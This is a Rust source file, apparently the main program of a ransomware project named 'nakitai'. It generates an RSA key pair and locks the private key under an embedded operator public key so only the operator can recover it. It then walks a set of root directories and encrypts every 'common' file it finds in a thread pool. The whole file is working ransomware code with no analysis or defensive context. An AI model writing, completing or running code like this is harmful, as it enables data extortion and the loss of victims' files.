use nakitai::{
    count_common_files, find_common_files, get_decrypt_key_nky_path, utils::crypto, ROOT_DIRS,
};
use openssl::rsa::Rsa;
use std::sync::mpsc::channel;
use threadpool::ThreadPool;

fn main() -> Result<(), anyhow::Error> {
    let og_public_key_b = include_bytes!("../../og_public.pem");
    let og_public_key = Rsa::public_key_from_pem(&og_public_key_b.as_slice())?;

    let (public_key, private_key) = crypto::gen_key_pair(2048)?;

    let decrypt_key_nky_path = get_decrypt_key_nky_path();

    crypto::encrypt_private_key(&decrypt_key_nky_path[..], &og_public_key, &private_key)?;

    #[cfg(debug_assertions)]
    {
        println!("decrypt_key_nky_path => {:?}", decrypt_key_nky_path);
    }

    let files_count = ROOT_DIRS
        .into_iter()
        .map(|i| count_common_files(i))
        .reduce(|acum, item| acum + item)
        .unwrap();

    #[cfg(debug_assertions)]
    {
        println!("Encrypting files count => {:?}", files_count);
    }

    let pool = ThreadPool::new(1);
    let (tx, rx) = channel();

    for dir in ROOT_DIRS {
        find_common_files(dir, |entry, _| {
            let tx = tx.clone();
            let public_key = public_key.clone();
            pool.execute(move || {
                let file_path = entry.path().display().to_string();
                match crypto::encrypt_file(&file_path, &public_key) {
                    Ok(_) => {}
                    _ => {
                        #[cfg(debug_assertions)]
                        {
                            println!("Failed file encryption => {:?}", file_path);
                        }
                    }
                }
                match tx.send(1) {
                    Ok(_) => {}
                    _ => {
                        #[cfg(debug_assertions)]
                        {
                            println!("Failed to send encrypted notification => {:?}", file_path);
                        }
                    }
                }
            });
        });
    }

    let finished_jobs = rx.iter().take(files_count).count();

    #[cfg(debug_assertions)]
    {
        println!("Encrypted files count {:?}", finished_jobs);
    }

    Ok(())
}
